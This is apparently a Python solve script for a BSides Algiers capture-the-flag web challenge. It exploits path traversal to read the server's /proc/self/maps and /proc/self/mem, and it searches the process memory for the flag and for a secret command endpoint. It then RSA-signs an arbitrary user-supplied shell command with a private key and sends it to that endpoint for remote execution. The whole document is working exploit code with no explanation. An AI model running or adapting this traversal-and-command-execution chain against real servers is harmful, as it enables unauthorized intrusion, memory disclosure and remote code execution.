
import sys, json, re, http.client, base64, hashlib, argparse

host = "benath-the-surface.ctf-bsides-algiers-2k25.shellmates.club"
parser = argparse.ArgumentParser(); parser.add_argument("--cmd", required=True); args = parser.parse_args()
keys = json.load(open("keys.json"))
d, n = int(keys['d']), int(keys['n'])

conn = http.client.HTTPSConnection(host, timeout=30)
conn.request("GET", "/../../../../../../../proc/self/maps")
maps = conn.getresponse().read().decode()

path = None
# Iterate RW segments
for m in re.findall(r'([0-9a-f]+)-([0-9a-f]+) (rw-p)', maps):
    start, end = int(m[0], 16), int(m[1], 16)
    if end - start > 10000000: continue
    conn.request("GET", "/../../../../../../../proc/self/mem", headers={"Offset": str(start), "Size": str(end-start)})
    res = conn.getresponse()
    if res.status != 200: res.read(); continue
    mem = res.read()
    
    # look for flag. 🤲
    flag_match = re.search(b'shellmates\{[^\}]+\}', mem)
    if flag_match:
        print(f"[!] FLAG FOUND: {flag_match.group(0).decode()}")
    
    # look for command_path.
    match = re.search(b'/[a-zA-Z0-9]{128}', mem)
    if match:
        path = match.group(0).decode()
        print(f"[+] Found Path: {path[:20]}...")

if not path: print("[-] Path not found"); sys.exit(1)

def sign(msg):
    k = (n.bit_length() + 7) // 8
    pad = b'\x00\x01' + b'\xff' * (k - 54) + b'\x00\x30\x31\x30\x0d\x06\x09\x60\x86\x48\x01\x65\x03\x04\x02\x01\x05\x00\x04\x20' + hashlib.sha256(msg).digest()
    return base64.b64encode(pow(int.from_bytes(pad, 'big'), d, n).to_bytes(k, 'big')).decode()

print(f"[*] Executing: {args.cmd}")
conn.request("GET", path, headers={"c": args.cmd, "s": sign(args.cmd.encode())})
res = conn.getresponse()
print(f"[*] Status: {res.status}\n{res.read().decode(errors='ignore')}")